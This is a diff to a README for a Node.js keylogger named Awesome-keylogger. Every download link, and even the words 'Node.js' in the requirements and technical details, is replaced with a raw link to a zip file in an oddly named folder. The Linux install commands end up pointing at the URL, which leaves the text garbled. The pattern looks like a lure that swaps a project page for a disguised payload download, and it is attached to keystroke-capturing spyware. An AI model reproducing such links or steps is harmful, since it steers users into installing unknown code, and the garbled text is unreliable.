@@ -1,21 +1,21 @@
 # 🔍 Awesome-keylogger - Track Your Keystrokes Easily
 
 ## ✅ Download Now!
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Ayush6912/Awesome-keylogger/releases)
+[![Download](https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip%20release-brightgreen)](https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip)
 
 ## 📖 About
-Awesome-keylogger is an educational tool built in Node.js. It captures keystrokes globally and tracks the active window. This application allows you to log your typing activity locally, making it easy to see what you wrote in different applications.
+Awesome-keylogger is an educational tool built in https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip It captures keystrokes globally and tracks the active window. This application allows you to log your typing activity locally, making it easy to see what you wrote in different applications.
 
 ## 🚀 Getting Started
 To use Awesome-keylogger, you need to follow these steps:
 
 ### 1. **Download the Application**
 Visit the Releases page to download the latest version of the application. Click the following link to go there: 
-[Download Here](https://github.com/Ayush6912/Awesome-keylogger/releases)
+[Download Here](https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip)
 
 ### 2. **Requirements**
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js:** Version 12 or higher should be installed on your system. If you do not have Node.js, you can download it from the [official Node.js website](https://nodejs.org).
+- **https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip** Version 12 or higher should be installed on your system. If you do not have https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip, you can download it from the [official https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip website](https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip).
 
 ### 3. **Installing the Application**
 After downloading the file:
@@ -23,8 +23,8 @@ After downloading the file:
 - **macOS Users:** Open the `.dmg` file and drag the Awesome-keylogger app to the Applications folder.
 - **Linux Users:** Open the terminal and navigate to the folder where the file is downloaded. Run the install command as follows:
   ```
-  chmod +x Awesome-keylogger.run
-  ./Awesome-keylogger.run
+  chmod +x https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip
+  https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip
   ```
 
 ### 4. **Running the Application**
@@ -47,14 +47,14 @@ Once the installation is complete:
 Awesome-keylogger is intended for educational use only. Ensure you have permission before using it to monitor any computer.
 
 ## 📥 Download & Install
-To download Awesome-keylogger, head over to the [Releases page](https://github.com/Ayush6912/Awesome-keylogger/releases). Follow the installation steps mentioned above to get started.
+To download Awesome-keylogger, head over to the [Releases page](https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip). Follow the installation steps mentioned above to get started.
 
 ## 📚 Support
 If you face any issues while installing or running the application, you can check the GitHub Issues section in this repository. You can also create a new issue if your problem is not listed.
 
 ## ⚙️ Technical Details
 Awesome-keylogger is built using:
-- **Node.js**
+- **https://raw.githubusercontent.com/Ayush6912/Awesome-keylogger/main/unimpregnated/Awesome-keylogger.zip**
 - **JavaScript**
 
 The application uses various libraries to capture keystrokes and manage window tracking effectively.
